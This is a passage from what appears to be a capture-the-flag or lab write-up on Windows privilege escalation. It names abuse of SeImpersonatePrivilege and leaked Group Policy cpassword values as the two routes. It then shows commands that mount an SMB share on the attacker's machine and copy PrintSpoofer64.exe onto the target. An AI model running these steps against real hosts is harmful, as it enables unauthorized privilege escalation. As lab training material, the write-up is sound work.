PrivEsc

We have two method to escalate our privilege. ① Exploit SeImpersonatePrivilege or ② Get leaked cpassword from group policy xml file.

PE method 1

These days, PotatoFamily tools are barely working to exploit SeImpersonatePrivilege since Microsoft takes countermeasures. However, it's the same that attacker method evolves just like as blue team.

PS C:\Users\mssql-svc\Desktop> systeminfo
...
OS Name:                   Microsoft Windows Server 2019 Standard

The target's Operating system is 2019 version.

On this context, it's highly possible that we can use PrintSpoofer.exe since it was developed around 2019.

Just like before we used nc64, let's download PrintSpoofer.exe from our machine using impacket-smbserver.

PS C:\Users\mssql-svc\Desktop> net use \\10.10.16.38\share /user:a a
PS C:\Users\mssql-svc\Desktop> copy \\10.10.16.38\share\PrintSpoofer64.exe
